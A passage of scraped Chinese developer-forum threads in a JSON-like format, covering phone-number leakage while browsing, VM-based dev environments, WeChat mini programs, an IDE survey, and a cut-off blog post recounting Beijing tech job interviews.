"手机+蜂窝数据的话，运营商自己就提供查询号码的 API ，第三方网站能拿到号码不稀奇\r", "其他两种方式的话，应该是百度把你的数据卖了，似乎目前出现号码泄露的基本都是通过百度搜索跳转后出现的", "早就有了，我暴一条， 小米自带浏览器如果你最近有找工作的话（打开拉钩之类的网站），打开会直接跳到某些公司的招聘页面。", "每日安全資訊：\"手機號抓取\"成灰色營銷利器 瀏覽網頁即泄露號碼 ", "\r", "手機剛百度一下，號碼就已泄給商家 ", "\r", "揭秘「手機號碼抓取平台」的黑色產業 ", "\r", "剛用手機瀏覽網頁商家電話就打來 誰泄漏了信息？ ", "买电话这种事不是很常见么..一家买了 还可以跟同行互换下资源", "什么叫做大数据？大数据不就是提供这样的应用？", " #11 百度：抱歉刚好出事的页面没有 https", "私以为，运营商也能搞这个事情。", "我没用百度，也天天收到贷款卖房中介的骚扰，也不知道哪个网站泄漏出去的，现在的办法就是两张卡，一张不接电话的用来网上使用", "珍爱生命 远离百度", "与百度无关，现在有这样的平台提供 js ，可以直接拿到手机号或直接开启 qq 对话，还有百度霸屏。", " #49 \r", "都不用 js 我可以把账号连密码都给你 你能弄出完整绑定手机号就行", "运行商也有这种系统的, 大数据抓取你的百度搜索记录, 卖给广告主", "这个很早之前就有了，只要手机浏览过网页，电话， QQ 等信息都能给你抓到。", "按照这个逻辑。你说会不会百度一下“妹子”，就会有妹子主动打电话找约的？", "我今天百度搜了一下股票涨停的概念，然后下午接了 3 个股票配资的电话，卧槽接下来估计闲不下来了", "百度是有获取自身绑定手机号的接口的，不是每个接口都打了星号的", " 手贱点了一下链接，刚马上接到贷款的电话了。。。。", "记得安卓手机的话\r", "代码好像是可以拿到手机的手机号", "这个锅应该不归百度背吧，小心百度起诉你", " 说明你被百度精准识别了", "我搜某云后不到 5 分钟就来电话了……", "早就有了啊，我也中招了，必须百度账号的问题。", "有些账户真不能绑手机号", "还好你朋友搜的不是时间短怎么治。。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>近期的一个项目，是做财务的，采用的技术栈是 Oracle 家桶。</p>\n<p>感觉 Oracle Database 很臃肿，我就寻思着把它弄到虚拟机里面去。再加上我个人有点洁癖，不喜欢主机系统安装一些乱七八糟的东西。</p>\n<p>然后我就想为什么不把开发环境全部放到虚拟机呢？而且虚拟机可以导入导出，备份和同步也特别方便。</p>\n<p>有朋友是这么做的么？会不会很卡 - -！</p>\n</div></div>"], "reply": "34", "tittle": "开发环境全部放虚拟机可行么？", "comment": ["我以前也这样的，但是发现有一堆权限要设置（网络访问）所以要么把整个开发项目也搬到虚拟机，要么就洗洗睡吧", "可以的，推荐使用 Vagrant ，搭配 Ansible 或者 Chef 可以很方便的搭建开发环境", "可行，我用 PD 跑 VS2017 ，体验和真机差别不大，唯一的缺点就是 IO 有点慢", " Vagrant 确实是个好东西。", "可以的，我用的开源的 virtualbox 安装的 ubuntu  已经平稳运行近 3 年（中间还有系统升级从 12 升到 14 ） 特效全关，入丝般顺滑", "可行，曾经我就是这么做的， Oracle 全家桶放一个 Hyper-V 虚拟机里，日常开发完全不虚。", "建议你使用 Vagrant", "vagrant 启动一个虚拟机要多少秒？能快速唤醒吗？", "以前也是用虚拟机的    自从 docker 出来之后  全部用上了 docker", "第一次了解 Vagrant 。\r", "感觉和 Docker 差不多，只是用虚拟机实现虚拟化。", "一直这么干， vagrant 也用过，不知为何总会遇到些问题后来还是滚回直接用虚拟机了。", "当然可行，而且在进行重大更新或者配置更新前来个快照，不要太方便了\r", "\r", "就是太吃机器性能了\r", "\r", "高配台式机，直接虚拟机走起\r", "笔记本，常用的开发环境还是走本机，不常用的虚拟机走起", " vagrant 是虚拟机管理工具，启动时间多久取决于虚拟机。", " 多谢！", "可以用 instantclient ，完全绿色，强迫症福音\r", "\r", "虚拟机完全可行，快照转移挺方便的", "以前在 oracle 开发 saas 的时候开发环境就全部是虚拟的，每天工作打开 vnc 连上环境。", "如果可以的话, 申请一台电脑安装 oracle", "可行，专门弄了一台服务器这么干", "主机 Windows 玩游戏，虚拟机 Arch Linux 做开发，无压力。", "一个 oracle 就吃资源了还挂虚拟机里那性能真没办法。当然你配置很强大就没区别了。", "可以啊 看你的虚拟机有多么强力 vSphere 也叫虚拟机 自己装个 virtualbox 也叫虚拟机", "docker?", "应该还有 IDE 什么的，当我没说", "可以用 docker/docker-compose\r", "本机写代码， docker 跑测试环境\r", "Mac 下可以用我的这个 oracle image\r", "楼主记得一定要做好热备份，同一业务必须在两台不同母鸡上有相同拷贝", " 一直想用 Docker 把开发环境全打包起来，有这方面的教程或好的建议吗？谢谢", " \r", "\r", "我正在做啊～ \r", "把 coreos 那层换成当前系统就好\r", "\r", "\r", "\r", "参照 rancheros 把 X11 那部分也容器化了", " \r", "\r", "目前就试了 libreoffice 和 VS code ，正在折腾做个优雅的环境控制什么的。。。", "我司正式环境都是用 vSphere ，还挺好的", "oracle 还算干净吧，配置文件不乱放，比 sql server 清洁多了，后者别说狂写注册表了，连程序文件都分散在了好几个地方", "公司配的 IMAC ，但是开发环境要用 docker ，为了用原生就开了个 vbox 把所有环境都装里面（包括桌面）。一年多用下来非常舒爽。", "docker pull 一个 arch 做成开发容器保存成镜像，代码一直放 docker ，很方便。", "推荐使用华为的 FusionAccess 。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>之前一直以为不会开放，不知道现在基于什么原因考虑又开放了</p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MjM5NDAwMTA2MA==&amp;mid=2695729676&amp;idx=1&amp;sn=2f0279377bcc6b0ea14d30389dfde698&amp;chksm=83d74bc7b4a0c2d197ebad8e77b4e6a3f5c19a6ef91f0602b4a695d2ef0994fd1e6431a5babb&amp;mpshare=1&amp;scene=1&amp;srcid=03273zepsNqmTivQ4bksNp7M&amp;key=87b69e4981d1596d2d10078dbb8eda908b829f2cc69b30c86e1868f486f8557fef4b4516ff59b47fe9119167efcd1bd8114040a907fbd40fbb27cc4219b147f6b42fd8d741353bef7e9e722bbd9267da&amp;ascene=0&amp;uin=MTM5MDQ0MDMxOQ%3D%3D&amp;devicetype=iMac+MacBookPro11%2C1+OSX+OSX+10.12.1+build(16B2555)&amp;version=12010310&amp;nettype=WIFI&amp;fontScale=100&amp;pass_ticket=UL6jKoQWaLazJ9X%2FPeUDX%2FCK7bt8Dm6Rc4iFT1Ja44fDAGXE2bHyep2RXrx5cpSi\" rel=\"nofollow\">官方文章</a></p>\n</div></div>", "<div class=\"topic_content\">相比于小程序，还是比较看好 web 开发，现在 web 开发在移动端的“限制”主要就是性能和网络速度这两个，而像小程序这种，还要依赖微信，我觉得吧，如果你的应用没有用到微信相关服务，那还不如开发一个独立的 app 好</div>"], "reply": "124", "tittle": "小程序对个人开发者开放了！！！", "comment": ["我只想问一句，去买备案过的域名靠谱吗？", "我觉得公众号有点 App Store 的意思了，不知道想的对不对……", "作吧", "然后呢？", "小程序唯一的优点就是流量，然后他把各种入口都给封了。", "貌似张小龙从没说过要颠覆 app 之类的话，一堆人代替微信说小程序要颠覆然后开启嘲讽......\r", "直接用微信就能开锁单车，出国查查外交部的小程序，不挺好的嘛。不用时微信还是那个微信，没有丝毫打扰，用时能感觉到方便，这就够了。\r", "\r", "也没见小程序逼着开发者和用户放弃 app 、 web ，多种形态，百家争鸣，至于像有深仇大恨一样嘛", " 对...有需要就用，有需要去做。", "B 装的有点大，入口太深，脑子被驴踢了吧，而且还没有推送", "不能支付。。", "入口深不是问题，问题在于，\r", "\r", "1. 审核太严， SDK 太烂，无法发挥创造力\r", "2. 不能跳转网页、微信公众号，无法变现\r", "\r", "吃力不讨好，还削弱自己网站、 app 的流量，谁去做啊？", " \r", "\r", "这东西要浏览器支持, 现在只是 Chrome 支持 PWA. \r", "\r", "何止是 iPhone 不会兼容, Android 这边 UC, QQ 等国内浏览器目测也不会支持.", "想想前几天 v 站一大帮 id 跳出来炒作这玩意儿，真令人齿冷。", " 哪来的自信", " 放着一个 神器 QQ 不用，拿个蛋疼的微信工作折腾自己，也是够醉的。", " 没必要，除非这个域名本身有很多流量。而且当你换主机了，可能要重新备案。", "个人觉得无意义，为啥？因为我从来没用过，时间成本操作成本太高。", "企鹅从来就没有放弃过小程序", "小程序完全就是个鸡肋，刚发布时装了几个，后来全删光了。其它厂商也没那么傻，把自己的用户全送给微信！都去用微信了，自己还怎么活。逻辑思维就是个例子，公开倒戈张小龙和小程序。“用完即走”，呵呵呵", "小程序已经完全失败了，一个互联网产品到现在还是不温不火，基本就是在等死了!", " 一样，到现在也没用过", " 我觉得倒是没有失败， BS 颠覆 CS 这种话腾讯又没说，而且很重要的一点就是微信没有给小程序的入口，很多人根本不知道这玩意", "已经在 rss 里添加了“小程序”关键词过滤。你说我有多烦它。到处吹。", " 不是说不备案的域名和服务器不在微信的白名单么。海外党国内无身份根本无法备案。", "关于小程序开发的经验分享，腾讯云有出经验分享帖，大家可以去看看~\r", "当然，我们 minapp 也有经验分享案例，有兴趣可以瞧瞧~\r", "传送门就不放上来了，有需求的同学可以看我介绍~"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>调查下大家工作的公司用的最多的 IDE ，最好写出语言，比如 eclipse - Python 这样</p>\n</div></div>"], "reply": "181", "tittle": "调查下大家公司用的最多的 IDE", "comment": ["vs2015+vscode", "LispreIDE", "Eclipse - Java\r", "但是我是 idea 党", "phpstorm", "vim - php", "notepad++ - C\r", "但我是 vim 党", " 老哥 头像稳", "Android Studio, IEAD", "IDEA 挽救我的打字速度；\r", "Atom 已经落灰随后被删除，写点 html 时会用 VSCode ；\r", "ssh 除了 vim 有得选吗……", "vscode ，感觉这货定位介于编辑器与 ide 之间。比编辑器强大比如集成 git/terminal/debug 等，同时又比一般的 ide 轻量。我是从 webstorm 转过来的", "翻了一圈 好像没人说 acme editor 啊(Rob Pike 很喜欢这货啊貌似", "Visual Studio: C++\r", "PyCharm: Python\r", "Visual Studio Code: Go\r", "Vim: C++/Python/Go", "全部开 Vim 模式。", "SublimeText + Atom.", "JB(JetBrains)全家桶", "公司大多数 emacs", "webstorm->html/css/js\r", "vscode->go\r", "eclipse->java/python/php", "VSC with VIM - React Native", "Android Studio", "phpstorm", "vim(janus) - python\r", "vs code (python, js)", "vscode & vim", " 老哥 35 瓶？", "Xcode", "vim - python", "jetbrain 家->go/html/css/js\r", "sublime->php/用来查看杂七杂八的日志文件等等\r", "vscode->小 demo+查看标准 go 库和第三方库源码", "VS2017~~", "so what ？", "vscode", "Eclipse (VIM/VSCode) - Java(PHP)", "idea-java", "AndroidStudio \r", "Xcode", "sublime text - golang", "宇宙最强 IDE vs2017", "Hbuilder", "Delphi 10.1 Berlin", "Xcode,\r", "Nodepad++\r", "VS Code\r", "\r", "IntelliJ -> Java\r", "vim -> 其他", " 神预测", "vs2017", "除了 c#，其他无论什么都用 sublime text", "Eclipse", "自用 JetBrains \r", "\r", "公司  eclipse", "idea-java\r", "vscode-其他", "source insight", "*idea-java\r", "*webstorm-前端\r", "atom-前端\r", "sublime-文本查看编辑器", "vim - Node/JavaScript", "xcode atom sublime", "webstorm - html css javascript.\r", "pycharm - python.\r", "xcode - swift objective-c.\r", "android studio - java.\r", "intellij - java.\r", "以上。", "eclipse  ue", " 好厉害。。。", " 下午时间无聊做个调查打发时间不要被主管看到就行", "source insight + RVDS/MULTI+cgywin--C 码畜", " 用 C 的都是大神啊。。。", "phpStorm\r", "xcode\r", "webStorm\r", "PyCharm\r", "\r", "使用频率由高到低，每个 ide 至少做过两个项目。\r", "最近刚好集中用了一遍，一段时间不用就 remove from dock 了。\r", "都是各自领域里最好的 ide.\r", "\r", "vim 也很棒，我有多年使用经验，以前用 window 时有个项目本地装不了 sphinx 插件，是用 vim 写的。\r", "平心而论，使用熟悉的语言编程时可以选择 vim ，当你确实需要一个 ide 的时候， vim 不是个好选择。\r", "比如 PyCharm 随手教我写出较为规范的 python 代码， vim 不能轻易做到这点。", "idea+vscode+vim", "Java/Kotlin - Idea\r", "Python - PyCharm\r", "Frontend - WebStorm\r", "Android - Android Studio\r", "Go - Gogland", "C++/C# - VS2013\r", "Python - PyCharm", "没有 coda 吗？", "Sublime", "QtCreator - C++\r", "Eclipse - C++\r", "Visual Studio - C++\r", "vim - python", "IntelliJ IDEA -- java\r", "sublime3 -- node/python\r", "notepad++ -- other", "sublime 续一秒", "主力 vscode\r", "python -- pycharm\r", "ios -- xcode\r", "Android -- AS", "vim + atom", "vs2015&notepad++", "VS Code", "jetbrains family", "go liteIDE\r", "lua zerobranestudio\r", "markdown mweb\r", "php phpstorm coderunner\r", "txt  sublime text", "phpstorm 开发 php+golang", "VSCODE\r", "\r", "主力 PHP GOLANG", "emacs python\r", "emacs lua\r", "emacs c\r", "emacs c++\r", "emacs sh", "sublime text", "Vim - Ruby/JS", "PHP - Zend Studio", "高大上的 eclipse", "VS2017\r", "Notepad++\r", "高低搭配，干活不累", "不用 IDE ，一个 sublime text 战天下，试用版，除了经常弹出让我购买的对话框外没什么缺点。", "vs2010 ……", "atom+xcode", " +1", " 诶，我也用 VS2010"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>0.背景</h1>\n<p>博主本人 2015 年毕业于郫县某 985 大学通信工程系，因为大学期间一直自己创业所以错过了大四秋招春招，毕业后又在北京继续创业一年，但在创业公司一直无法沉淀技术累积，于 16 年年底萌生进大公司学习的想法，于是从 16 年年底开始通过社招找工作。虽然大学就开始做研发，但无奈简历只看毕业工作经验，所以本人简历只有一年工作经验。</p>\n<p>在此总结一篇文章给各位参考；</p>\n<h1>1.阿凡题</h1>\n<p>应该算是人生第一场面试，早上 11 点开始，公司是做 k12 在线教育相关业务，在五道口那边；</p>\n<h3>一面</h3>\n<p>前台登记后发了一套笔试题，开始写，主要都是 Python 基础知识，不算难，基本就是 可变对象不可变对象区别、 Python 垃圾回收机制之类的题目，有一两道编程题也很简单，最后有个根据题目设计数据表的问题也不难，搞定后等面试官开始二面；</p>\n<h3>二面</h3>\n<p>面试官好像是个主管，开始让做自我介绍，他在看我的笔试题，然后根据简历问了一些项目相关的问题以及简单的一些系统设计问题，之后大概问了问笔试题里一些问题和补充，感觉聊的比较开心，面试官也对之前我的经历比较感兴趣，于是去通知 CTO 进行三面；</p>\n<h3>三面</h3>\n<p>CTO 面里问题的广度和深度都很大，从服务器部署的相关知识到 Nginx 一些细节问题都有问到，不得不说问的还是比较全面的，印象最深的应该是这个问题：</p>\n<h4>浏览器的一个请求从发送到返回都经历了什么，讲的越详细越好</h4>\n<p>我大概讲下我的答案：</p>\n<p>1 、先从网络模型层面：</p>\n<p>client （浏览器）与 server 通过 http 协议通讯， http 协议属于应用层协议， http 基于 tcp 协议，所以  client 与 server 主要通过  socket 进行通讯；</p>\n<p>而 tcp 属于传输层协议、如果走 https 还需要会话层 TLS 、 SSL 等协议； 传输层之下网络层，这里主要是路由协议 OSPF 等进行路由转发之类的。再向下数据链路层主要是 ARP 、 RARP 协议完成 IP 和 Mac 地址互解析，再向下到最底层物理层基本就是 IEEE 802.X 等协议进行数据比特流转成高低电平的的一些定义等等；</p>\n<p>当浏览器发出请求，首先进行数据封包，然后数据链路层解析 IP 与 mac 地址的映射，然后上层网路层进行路由查表路由，通过应用层 DNS 协议得到目标地址对应的 IP ，在这里进行 n 跳的路由寻路；而传输层 tcp 协议可以说下比较经典的三次握手、四次分手的过程和状态机，这里放个图可以作为参考：</p>\n<p><img alt=\"\" src=\"http://ocwt4ikj4.bkt.clouddn.com/18D3B9C2-D3F5-4F89-82BB-53B717D89BB5.jpg?watermark/2/text/cmFwb3NwZWN0cmU=/font/5b6u6L2v6ZuF6buR/fontsize/500/fill/I0VGRUZFRg==/dissolve/100/gravity/SouthEast/dx/10/dy/10\"></p>\n<p>2 、应用层方面：</p>\n<p>数据交换主要通过 http 协议， http 协议是无状态协议，这里可以谈一谈 post 、 get 的区别以及 RESTFul  接口设计，然后可以讲服务器 server 模型 epoll 、 select 等，接着可以根据实际经验讲下 server 处理流程，比如我： server 这边 Nginx 拿到请求，进行一些验证，比如黑名单拦截之类的，然后 Nginx 直接处理静态资源请求，其他请求 Nginx 转发给后端服务器，这里我用 uWSGI, 他们之间通过 uwsgi 协议通讯， uWSGI  拿到请求，可以进行一些逻辑， 验证黑名单、判断爬虫等，根据 wsgi 标准，把拿到的 environs 参数扔给 Django ， Django 根据 wsgi 标准接收请求和 env ， 然后开始 start_response ，先跑 Django 相关后台逻辑， Django 拿到请求执行 request middleware 内的相关逻辑，然后路由到相应 view 执行逻辑，出错执行 exception middleware 相关逻辑，接着 response 前执行 response middleware 逻辑，最后通过 wsgi 标准构造 response ， 拿到需要返回的东西，设置一些 headers ，或者 cookies 之类的，最后 finish_response 返回，再通过 uWSGI 给 Nginx ， Nginx 返回给浏览器。</p>\n<p>谈完后 CTO 根据我说的一些细节提出了一些问题，最后当时就谈了 offer ， CTO 说不走 hr 那边了直接和我谈，比较意外的是 offer 给的比我自己要的还高 5k 。对于第一次找工作的我来说当时满心激动。</p>\n<p>最后大概说说环境：公司在五道口一栋写字楼内容，规模还算比较大，听 CTO 谈做的事情也比较有意思，有机器学习、大数据等等 （ 主要是处理各种初高中学科的题目，涉及到文字识别深度学习等等，当然我如果进去肯定要从业务写起 ），包午餐、下午茶之类的其他我就不太清楚了，因为下午就走了，不过公司好像是每周六天班。公司发展感觉还是比较高速，感兴趣的同学可以去试试。</p>\n<h1>2. 学堂在线</h1>\n<p>公司也在五道口，清华科技园里， Google 前中国办公室对面的楼里 （ 好像现在搬到 Google 那里了 ）</p>\n<h2>一面</h2>\n<p>一面面试官应该是个后端研发工程师，感觉有些羞涩，全程一直不看我，主要聊了一些简历里的项目经验，系统设计，然后问了几个简单的算法题和一些 Python 的基本知识，然后就去叫二面面试官了。</p>\n<h2>二面</h2>\n<p>二面面试官是部门主管，嗯，这次总算看着我跟我聊了，哈哈，感觉目光交流也很重要，同样问了一些系统设计的问题和经验问题，因为博主 Django 相关的经验还算比较丰富，感觉他们也主要是找业务研发，所以没什么意外就过了。</p>\n<h3>三面</h3>\n<p>hr 面，主要问了一些薪资期望，发展规划之类的，主要是聊天，然后就发了 offer 。</p>\n<p>学堂在线主要是做慕课平台，并且是和国内各大高校合作，福利方面因为最后没有去所以不是特别了解，公司环境还是不错的。</p>\n<h1>3.果壳</h1>\n<p>果壳在国贸百朗园里，在园区最里面，不是很好找，一进去先发了一套面试题和一张登记表，登记表连父母家庭资料都要，不是很理解要面试者这些信息干什么，又不一定去你家，等入职再填不行吗？所以除了本人信息，其他我没填。（ 面了这么多家就果壳要填这个，还要填特别详细的信息，不能懂 ）</p>\n<h2>一面</h2>\n<p>面试题难度适中，不过涉及到的面比较多，还要写数据库查询语句等等，博主非科班，只大概自学过数据库，然后一直在用 orm ，毕业后就没怎么写过原生 SQL ，相关题目只能凭借记忆大概写了下，还有一道题是 用 O(1) 的复杂度实现一个 栈 的出栈入栈和返回 max 、 min 值的操作，其他就是一些 Python 基础和表设计题。</p>\n<p>这里说下这道设计栈的题：</p>\n<p>出入栈函数 O(1) 没什么问题，主要是 max 、 min 操作（ 博主找工作时没看过面试题目，只是刷了一些 LeetCode ，后来发现这道题很经典，网上很多答案）当时没遇到过这种需求，但是可以肯定想要时间复杂度下降，肯定是要用空间去换时间，所以当时有设计了额外的数据结构存 max min ，但当时设计的还是有问题，后面又和面试官讨论了一下，还是没有得出最好的方案，最后回去网上搜了下发现其实很简单，当时只差最后一步，感兴趣的同学可以看下：<a href=\"http://www.mamicode.com/info-detail-484000.html\" rel=\"nofollow\">栈在 O(1) 时间内求 min</a></p>\n<h2>二面</h2>\n<p>面试官一上来就直接拿着笔试题开始一道一道问，嗯，连我叫什么都没让介绍，更别说介绍项目什么的，感觉有点懵逼，全程没一句废话，全是纯技术问题和算法，然后自己擅长的面试官感觉不太感兴趣，我不太熟悉的他很愿意追问，嗯，二脸懵逼，之后又问道 tcp 流量控制，当时直接说错给说了拥塞控制，面试官表示我 tcp 掌握的不好（ 确实是我的问题，回去之后又整个看了一遍 tcp ）。</p>\n<p>最后又问了很多数据库底层的东西，博主完全没接触过，所以面试官表示下一轮面试官有事 （ 哈哈哈 ），接着问我有什么想问的，我问了两个问题面试官表示自己还有事。。。好吧，那就不聊了。</p>\n<p>总结：数据库知识很重要，即使你投的是研发不是 dba ，你也一定要懂数据库底层的基本原理，至少要知道 索引原理、 MySQL 数据引擎等等，因为之后凡是博主挂的面试都有数据库的锅。</p>\n<p>果壳环境看上去有些乱，但比较温馨，但实在不敢恭维面试的方式，所以挂了博主也没惋惜。其他方面就不太了解啦，因为根本没拿到 offer 。</p>\n<h1>4.Veeva</h1>\n<p>公司也在国贸附近，是一家给生物科技企业（ 药厂 ）做 crm 的外企 ( 不过国内的好像和国外母公司没什么关系，就是个单独的子公司 )，不算是互联网公司，但是薪资很给力。</p>\n<h2>一面</h2>\n<p>首先是 phone interview ， hr 大概问了问跳槽的原因，项目经验，发展规划等，然后发来 homework ，做完后提交；</p>\n<h2>二面</h2>\n<p>homework 比较简单，就是一个判断是否润年的函数，不过这里是有坑的，当题目很简单时，人家考验的就不是智商了，而是看你的编码能力，工程化能力及面向对象抽象能力，所以果断完整的写了个工程，加上完整的测试，然后提交之。</p>\n<h2>三面</h2>\n<p>hr 说技术同事看了 homework 感觉还是比较 ok 的，所以约面试，首先来的面试官好像就是个 leader ，问了很多 Python 和 Django 相关的基础知识和算法题，现场有个白版，直接在上面她出题，我写，然后她 review ，基本上就是 LeetCode easy 难度的题，没有太大问题。</p>\n<h2>四面</h2>\n<p>应该是个技术大牛，问了问经验开始系统设计，我记得当时是让设计一个短网址生成方案，有一些额外要求，比如不能按照字符顺序生成短网址，而是要随机生成，如何避免碰撞，如何最大效率利用所有空间。</p>\n<p>具体方案可以看知乎，上面有人讨论过： <a href=\"https://www.zhihu.com/question/29270034\" rel=\"nofollow\">短链接是如何设计的</a></p>\n<p>然后面试结束。</p>\n<p>面试完后接到 hr 电话说技术同事感觉不错，问我有没有意向入职，但当时考虑还是想去互联网公司所以就拒掉了。不过 veeva 的薪资很给力，感兴趣的同学可以去看看。</p>\n<h1>5.知乎</h1>\n<p>博主的 dream company ，哈哈，去面试的时候特紧张。知乎在 768 创意园，环境很棒。</p>\n<h2>一面</h2>\n<p>一面面试官问了项目经历及一些个人信息后开始考基础，主要是面试官出题，然后我在纸上写代码，难度适中，因为面试的比较久了，记不太清楚全部题目，记得让手写了快排，然后 Python 相关基础知识，一些 LeetCode 题， tcp 相关知识， epoll 服务模型、 tornado 的一些原理 （ 可以看博主之前文章 <a href=\"https://www.rapospectre.com/blog/understanding-tornado-ioloop\" rel=\"nofollow\">tornado ioloop 分析</a> ）数据库知识 （ 坦白掌握不多 ）末尾问了下二分查找，一面就过了。</p>\n<h2>二面</h2>\n<p>面试官好像是商业化后台的主管？问了项目经验，问了经历，对我大学期间创业经历表示赞扬，但毕业后又创业一年表示不满意（ 不是很明白为什么 ），之后开始问一些系统设计相关题目，印象比较深的是设计微信抢红包的构架，嗯，当时根据自己的见解说了一套系统和注意的点以及分配红包的算法，感觉面试官应该不太满意。回去后看了看网上，还真有写，果断研读了一发： <a href=\"http://www.open-open.com/lib/view/open1430729729960.html\" rel=\"nofollow\">微信红包构架设计</a>.</p>\n<p>后面又聊了一些系统设计相关的内容，然后让我等等。</p>\n<h2>三面</h2>\n<p>等了半个小时，期间看到前两面面试官一直在和 hr 讨论，应该是要不要我的问题，半个小时后 hr 来跟我聊了聊规划和项目以及为何来知乎，然后就回去周五前给回复。</p>\n<p>到此大概确定应该要我的可能性不大，应该是当做备胎了。 这里自己的问题主要是系统设计方面当时并没有准备，另一方面数据库这块明明果壳问到了但是没有重视起来。最后，年底出去找工作还是要谨慎，很多大点公司没什么招聘需求，除非特别优秀。</p>\n<p>最后，周五没有收到消息，基本确定挂了，果然在下周周一的时候收到了拒信，这点要赞一下，至少有明确的拒信，不像一些其他公司，嗯，就不明说了。</p>\n<p>知乎氛围觉得还是挺赞的， 福利也很好，包三餐，不加班，嗯，不多说了，都是泪。\n最近知乎开始大量招人了，大家可以去试试哦，替我完成我的 dc 梦，哈哈哈。</p>\n<h1>6.春雨医生</h1>\n<p>春雨医生在知乎隔壁，真的是紧隔壁，环境也不错~</p>\n<h2>一面</h2>\n<p>照例进行自我介绍，然后问项目经验，开始纸上写代码，不过这里要赞一下春雨，面试题都非常接地气，全是根据实际项目里的问题进行编码，比如有个给医生和病人聊天记录分组提醒的题目，都是类似的实际场景题目，完全没有那种纯算法题目，之后又聊了一些 Python Django 基础相关的东西，顺利进入二面。</p>\n<h2>二面</h2>\n<p>问了一些项目信息，然后开始系统设计，没记错的话应该是设计一个类似 QQ 的聊天工具，要求有群，并且可以发送图片、语音等各类消息，群管理员可以进行群管理等等。后面又问道数据库，直言数据库基础掌握的比较少，面试官也没有为难我。</p>\n<h2>三面</h2>\n<p>三面的时候到晚上饭点了， hr 姐姐超级好，带我去外面中餐馆点菜吃饭，回来后 CTO  面试， 考了阿凡题 CTO 问过的问题： <strong>浏览器的一个请求从发送到返回都经历了什么</strong></p>\n<p>于是本人又根据上面那个流程讲了一遍，接着又问了问自己的发展规划和期望，然后我问了问春雨相关的一些问题，面试结束。</p>\n<p>隔天收到了 offer ， 请我吃饭的小姐姐发给我的，哈哈，但是由于年前无法到岗，只能拒掉了。</p>\n<p>总体讲，春雨环境也很不错，但其他福利我也没有问，所以其他不太清楚咯，有兴趣的同学可以去试试。</p>\n<h1>7. 360</h1>\n<p>360 在酒仙桥，最不靠谱的面试。。。</p>\n<p>直接通过拉钩邀请第二天早上面试，当时已经下午五点。完全没打电话发短信，接到邮件的我一脸懵逼，于是主动打电话过去确认，得到肯定后第二天做两个多小时车赶往望京。 （ 我住在八宝山这块 ）</p>\n<h2>一面</h2>\n<p>前台不让进，让通知面试的人来接，等了会儿面试官来接我，然后七绕八绕不知道绕道哪去给了我一份笔试题，让我做，着重强调不要看手机 （ 本来就没打算看好嘛，我坐的头顶有个摄像头，你让我怎么看，哈哈哈 ）写完让我打他电话，然后他就闪了。</p>\n<p>我一看题目，除了前三道是 Python 之后全是 Linux 基础题，当时心里想：不亏是做安全的啊，要求就是不一样，然而博主半吊子 Linux 水平只会一些常用的命令，笔试题里的高端用法实在是臣妾不会做啊，于是本着诚实的原则做完会做的打了电话。</p>\n<h2>二面</h2>\n<p>面试官来没有让自我介绍，直接对着题目开始问 （ 我的内心已经产生了抵触感，和果壳一样 ）。第一题是个 Python 改错题，面试官问为何这样改，我大概讲了下，然后是讲了下 lambda 表达式并提供编程例子，面试官看完也没说什么，接着是一个用两个队列模拟栈，写实现代码，也没有太大问题，只是面试官也没有看代码，就是问了我怎么实现。</p>\n<p>接着到了 Linux 部分，基本都不会，会的也只能写出简单的命令，面试官直言：你这个笔试题做的不好啊。怎么都不会 （ 确实有我的问题， Linux 基础不好，但是直接否定了前面其他部分有点冤啊 ）</p>\n<p>接着问了一些项目经验，看到我的开源项目 <a href=\"https://github.com/bluedazzle/django-simple-serializer\" rel=\"nofollow\">djanog-simple-serializer</a> 问这是干嘛的，然后我说了下是序列化解决方案，面试官说：序列化不是很简单嘛？（ 我也没说难啊大兄弟，只是其他的没有好用的自己写了个嘛 ）接着面试官问了我一句让我十脸懵逼的话，作为一个不懂 Python 的人，你能给我简单讲讲 Django 和你做的东西吗？当时我的内心全是黑人问号脸， wtf ？不懂 Python ？那你招 Python ？ 怎么面试啊大兄弟，虽然我知道其他语言用的 6 写 Python 也没问题，但是招进来就要写业务你怎么也得找个有相关经验的面试吧，这下我明白为啥之前 Python 部分面试官不怎么看了。 此刻我只想赶紧离开了，于是就说感觉招聘需要和我不太一致，就不耽误时间了。</p>\n<p>好吧，应该我算是遇到个例，请大家不要对 360 产生偏见。</p>\n<h1>8. 今日头条</h1>\n<p>今日头条在中航广场，人民大学旁边，不得不说，是我面试过离我最近的公司，头条大楼很霸气。发展也很迅速。</p>\n<h2>一面</h2>\n<p>面试前一天晚上莫名失眠，真的是一宿没睡，睁眼到天亮，然后一脸懵逼的去面试，到了头条前台我勒个去，从没见过这么多人来面试，大厅做不下了，当时心里想：完蛋，这么多人，竞争得多激烈，昨晚还失眠，血崩。</p>\n<p>在前台签到，领了候选人的牌子，等了一会儿就叫到了我，由于面试的人实在太多，我实在 -1 楼食堂进行的面试，一面面试官是广告投放部门的工程师，先自我介绍，谈创业经历，问了 redis 用法及原理 （ 前面几次问到数据库的前车之鉴，博主特意狠狠看了下各种数据库的基本原理 ），然后根据我说使用 hash table 的经验，提了一个分布式 redis 使用 hash 的潜在问题，当时没有想出来，面试官提醒了下大概说到了点子上，主要是分布式机器 hash 后可能存在储存分配不均匀问题。然后 hash 表又问了冲突解决方案，主要是拉链法和进位法，之后聊了 tcp ，没什么问题。 问了排序算法的最小时间复杂度及原因。接着出了一道费那波数列的题，要求在常数时间复杂度内计算任意 fib(n) 当时可能没听清，估计没睡的原因，听成了常数时间复杂度，向面试官确认是常数时间复杂度 （ 面试官可能没听清我说的，以为我说的空间复杂度 ）于是苦思冥想无果，面试官提示动态规划，于是开始推导转移方程，最后面试官说没那么复杂，这时一对才发现我们理解岔了。其实很简单：</p>\n<pre><code>def fib(n):\n    a, b = 0, 1\n    for x in xrange(n):\n        a, b = b, a + b\n    return b\n</code></pre>\n<p>一面问题结束，在我写题的时候面试官看了我的博客和 GitHub ，表示满意 （ 有点惊讶，第一次有面试官看我博客和 GitHub ，虽然简历上有，但从没有人说看过 